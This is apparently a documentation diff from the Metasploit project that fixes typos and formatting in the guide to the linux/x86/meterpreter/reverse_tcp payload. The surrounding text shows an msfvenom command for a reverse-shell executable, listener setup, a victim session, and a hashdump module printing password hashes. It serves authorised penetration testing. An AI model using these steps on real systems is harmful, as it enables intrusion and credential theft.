@@ -1,4 +1,4 @@
-linux/x86/meterpreter/reverse_tcp is the most pouplar payload against the Linux platform. It allows
+linux/x86/meterpreter/reverse_tcp is the most popular payload against the Linux platform. It allows
 you to remotely take over the compromised system, having control of the file system, collect
 sensitive information such as credentials using post modules, etc.
 
@@ -50,7 +50,7 @@ To actually set the payload:
 
 1. In msfconsole, load the exploit.
 2. Do: ```set PAYLOAD linux/x86/meterpreter/reverse_tcp```
-3. Set the ```LHOST``` option, which is the [IP the payload should connect back to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
+3. Set the ```LHOST``` option, which is the [IP the payload should connect back to](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html).
 4. Run the exploit
 
 **As a standalone executable**
@@ -61,7 +61,7 @@ To use linux/x86/meterpreter/reverse_tcp as an executable, first you can generat
 ./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
-Before sending the exectauble to the victim machine, you need to set up the handler on your end:
+Before sending the executable to the victim machine, you need to set up the handler on your end:
 
 1. Start msfconsole
 2. Do: ```use exploit/multi/handler```
@@ -69,19 +69,19 @@ Before sending the exectauble to the victim machine, you need to set up the hand
 4. Do: ```set LHOST [Your IP]```
 5. Do: ```run```
 
-And that should start the listener. When the victim runs the malicious exectauble, you should
+And that should start the listener. When the victim runs the malicious executable, you should
 receive a session:
 
 ```
 msf exploit(handler) > run
 
-[*] Started reverse TCP handler on 172.16.23.1:4444 
+[*] Started reverse TCP handler on 172.16.23.1:4444
 [*] Starting the payload handler...
 [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
 [*] Sending stage (1495599 bytes) to 172.16.23.182
 [*] Meterpreter session 1 opened (172.16.23.1:4444 -> 172.16.23.182:45009) at 2016-07-06 22:40:35 -0500
 
-meterpreter > 
+meterpreter >
 ```
 
 
@@ -123,7 +123,7 @@ The ```upload``` command allows you to upload a file to the remote target. For e
 meterpreter > upload /tmp/data.bin /home/sinn3r/Desktop
 [*] uploading  : /tmp/data.bin -> /home/sinn3r/Desktop
 [*] uploaded   : /tmp/data.bin -> /home/sinn3r/Desktop/data.bin
-meterpreter > 
+meterpreter >
 ```
 
 **download**
@@ -143,7 +143,7 @@ interfaces on the remote machine.
 
 **getuid**
 
-The getuid command tells you the current user that Meterpreter is running on. For example:
+The ```getuid``` command tells you the current user that Meterpreter is running on. For example:
 
 ```
 meterpreter > getuid
@@ -166,7 +166,7 @@ The ```ps``` command lists the running processes on the remote machine.
 
 **shell**
 
-The shell command allows you to interact with the remote machine's terminal (or shell). For
+The ```shell``` command allows you to interact with the remote machine's terminal (or shell). For
 example:
 
 ```
@@ -180,7 +180,7 @@ If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.
 
 **sysinfo**
 
-The sysinfo command shows you basic information about the remote machine. Such as:
+The ```sysinfo``` command shows you basic information about the remote machine. Such as:
 
 * Computer name
 * OS name
@@ -195,7 +195,7 @@ Computer     : sinn3r-virtual-machine
 OS           : Linux sinn3r-virtual-machine 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 (i686)
 Architecture : i686
 Meterpreter  : x86/linux
-meterpreter > 
+meterpreter >
 ```
 
 **Other commands**
@@ -209,7 +209,7 @@ meterpreter > help
 
 ## Using a Post module
 
-One of the best things about Meterprter is you have access to a variety of post modules that
+One of the best things about Meterpreter is you have access to a variety of post modules that
 "shell" sessions might not have. Post modules provide you with more capabilities to collect data
 from the remote machine automatically. For example, stealing credentials from the system or
 third-party applications, or modify settings, etc.
@@ -223,7 +223,7 @@ meterpreter > run post/linux/gather/hashdump
 [+] root:$6$cq9dV0jD$DZNrPKKIzcJaJ1r1xzdePEJTzn5f2V5lm9CnSdkMRPJfYy7QVx2orpzlf1XXBbIRZs7kT9CmYEMApfUIrWZsj/:0:0:root:/root:/bin/bash
 [+] sinn3r:$6$S5lRz0Ji$bS0rOko3EVsAXwqR1rNcE/EhpnezmKH08Yioxyz/gLZAGh3AoyV5qCglvHx.vSINJNqs1.xhJix3pWX7jw8n0/:1000:1000:sinn3r,,,:/home/sinn3r:/bin/bash
 [+] Unshadowed Password File: /Users/wchen/.msf4/loot/20160707112433_http_172.16.23.182_linux.hashes_845236.txt
-meterpreter > 
+meterpreter >
 ```
 
 Note that in order to collect Linux hashes, Meterpreter needs to run as root.
@@ -237,7 +237,7 @@ meterpreter > irb
 [*] Starting IRB shell
 [*] The 'client' variable holds the meterpreter client
 
->> 
+>>
 ```
 
 **The client object**
